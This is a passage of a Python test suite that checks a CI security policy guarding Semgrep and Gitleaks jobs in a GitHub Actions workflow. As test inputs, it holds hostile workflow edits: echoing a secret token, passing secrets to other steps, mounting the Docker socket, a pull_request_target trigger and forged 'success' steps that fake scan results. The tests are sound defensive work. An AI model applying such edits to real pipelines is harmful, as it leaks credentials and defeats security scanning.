                shutil.copyfile(ROOT / f'.github/workflows/{name}.yml', self.root / f'.github/workflows/{name}.yml')

class SecurityPolicyTests(PolicyTests):
    def test_scanners_are_direct_unconditional_and_token_is_single_scope(self):
        data = yaml.load((ROOT/'.github/workflows/ci.yml').read_text(), Loader=yaml.BaseLoader)
        self.assertIn('semgrep', data['jobs'])
        self.assertIn('gitleaks', data['jobs'])
        for unit in ('gitleaks', 'semgrep'):
            job = data['jobs'][unit]
            self.assertNotIn('if', job)
            self.assertEqual(job['needs'], ['route'])
            self.assertEqual(job['runs-on'], 'ubuntu-24.04')
        token = [step for step in data['jobs']['semgrep']['steps'] if 'SEMGREP_APP_TOKEN' in step.get('env', {})]
        self.assertEqual([step['id'] for step in token], ['scan'])

    def test_scanner_boundary_mutations_rejected(self):
        mutations = [
            lambda d: d['jobs']['semgrep'].update(env={'SEMGREP_APP_TOKEN': '${{ secrets.SEMGREP_APP_TOKEN }}'}),
            lambda d: d['jobs']['semgrep'].update(**{'if': '${{ false }}'}),
            lambda d: d['jobs']['semgrep']['steps'].append({'run': 'echo extra', 'env': {'SEMGREP_APP_TOKEN': '${{ secrets.SEMGREP_APP_TOKEN }}'}}),
            lambda d: d['jobs']['ci-required']['needs'].remove('semgrep'),
            lambda d: d['on'].update(pull_request_target={}),
        ]
        for mutation in mutations:
            self.mutate('ci', mutation)
            self.assertTrue(check_policy.check(self.root))
            shutil.copyfile(ROOT/'.github/workflows/ci.yml', self.root/'.github/workflows/ci.yml')
        for identifier in ('preflight', 'admission', 'scan', 'proof'):
            for key, val in (('if', '${{ false }}'), ('continue-on-error', 'true'), ('run', 'echo forged-success')):
                def mutate(data):
                    next(s for s in data['jobs']['semgrep']['steps'] if s.get('id') == identifier)[key] = val
                self.mutate('ci', mutate)
                self.assertTrue(check_policy.check(self.root))
                shutil.copyfile(ROOT/'.github/workflows/ci.yml', self.root/'.github/workflows/ci.yml')

    def test_security_mutations_have_a_valid_baseline(self):
        self.assertEqual(check_policy.check(self.root), [])
        def step(data, unit, identifier):
            return next(s for s in data['jobs'][unit]['steps'] if s.get('id') == identifier)
        mutations = [
            ('workflow token', lambda d: d.update(env={'SEMGREP_APP_TOKEN': '${{ secrets.SEMGREP_APP_TOKEN }}'})),
            ('inherited secrets', lambda d: d['jobs']['server'].update(secrets='inherit')),
            ('other secret', lambda d: step(d, 'semgrep', 'scan')['env'].update(EXTRA='${{ secrets.OTHER }}')),
            ('token in run', lambda d: step(d, 'semgrep', 'scan').update(run='echo "${{ secrets.SEMGREP_APP_TOKEN }}"')),
            ('token renamed', lambda d: step(d, 'semgrep', 'scan').update(env={'OTHER': '${{ secrets.SEMGREP_APP_TOKEN }}'})),
            ('shallow history', lambda d: d['jobs']['gitleaks']['steps'][0]['with'].update({'fetch-depth': '1'})),
            ('wrong SHA', lambda d: d['jobs']['semgrep']['steps'][0]['with'].update(ref='master')),
            ('unsafe mount', lambda d: d['jobs']['semgrep'].update(container={'image': 'unsafe', 'volumes': ['/var/run/docker.sock:/var/run/docker.sock']})),
            ('local builds', lambda d: step(d, 'semgrep', 'scan').update(run=step(d, 'semgrep', 'scan')['run'] + ' --allow-local-builds')),
            ('product flag', lambda d: step(d, 'semgrep', 'scan').update(run=step(d, 'semgrep', 'scan')['run'] + ' --secrets')),
            ('fake completion', lambda d: step(d, 'gitleaks', 'proof').update(run='echo success')),
            ('proof before scan', lambda d: d['jobs']['semgrep']['steps'].reverse()),
            ('raw diagnostic', lambda d: step(d, 'semgrep', 'diagnostics')['with'].update(path='${{ runner.temp }}/security-semgrep/*')),
            ('diagnostic proof', lambda d: d['jobs']['gitleaks']['steps'][-1]['with'].update(path='${{ runner.temp }}/security-gitleaks/diagnostics.json')),
            ('extra token command', lambda d: d['jobs']['semgrep']['steps'].insert(3, {'run': 'echo extra'})),
            ('defaults working directory', lambda d: d.update(defaults={'run': {'working-directory': '/tmp'}})),
        ]
        for label, mutation in mutations:
            with self.subTest(mutation=label):
                self.mutate('ci', mutation)
                self.assertTrue(check_policy.check(self.root))
                shutil.copyfile(ROOT / '.github/workflows/ci.yml', self.root / '.github/workflows/ci.yml')

    def test_duplicate_mapping_keys_cannot_hide_credentials(self):
        path = self.root / '.github/workflows/ci.yml'
        path.write_text(path.read_text() + "env: {HIDDEN: '${{ secrets.OTHER }}'}\nenv: {}\n")
        self.assertTrue(check_policy.check(self.root))

    def test_observer_product_and_engine_flags_are_required(self):
        self.assertEqual(check_policy.check(self.root), [])
        path = self.root / 'scripts/ci/semgrep_observer.py'
        original = path.read_text()
        for flag in ('--code', '--supply-chain', '--pro', '--no-suppress-errors', '--verbose'):
            with self.subTest(flag=flag):
                path.write_text(original.replace("'" + flag + "'", "'--secrets'", 1))
                self.assertTrue(check_policy.check(self.root))
        path.write_text(original)

    def test_native_skipped_paths_require_verbose_observer_command(self):
        path = self.root / 'scripts/ci/semgrep_observer.py'
        command = [
            'semgrep', 'ci', '--code', '--supply-chain', '--pro', '--no-suppress-errors',
            '--verbose', '--disable-nosem', '--disable-version-check',
            '--metrics=off', '--json-output=/out/semgrep.json',
        ]
        path.write_text('COMMAND = ' + repr(command) + '\n')
        self.assertTrue(check_policy.observer_command_valid(self.root))
        command.remove('--verbose')
        path.write_text('COMMAND = ' + repr(command) + '\n')
        self.assertFalse(check_policy.observer_command_valid(self.root))

    def test_production_observer_rejects_unsupported_strict(self):
        path = self.root / 'scripts/ci/semgrep_observer.py'
        command = [
            'semgrep', 'ci', '--code', '--supply-chain', '--pro', '--no-suppress-errors',
            '--verbose', '--disable-nosem', '--disable-version-check',
            '--metrics=off', '--json-output=/out/semgrep.json',
        ]
        path.write_text('COMMAND = ' + repr(command) + '\n')
        self.assertTrue(check_policy.observer_command_valid(self.root))
        command.insert(6, '--strict')
        path.write_text('COMMAND = ' + repr(command) + '\n')
        self.assertFalse(check_policy.observer_command_valid(self.root))

if __name__ == '__main__': unittest.main()
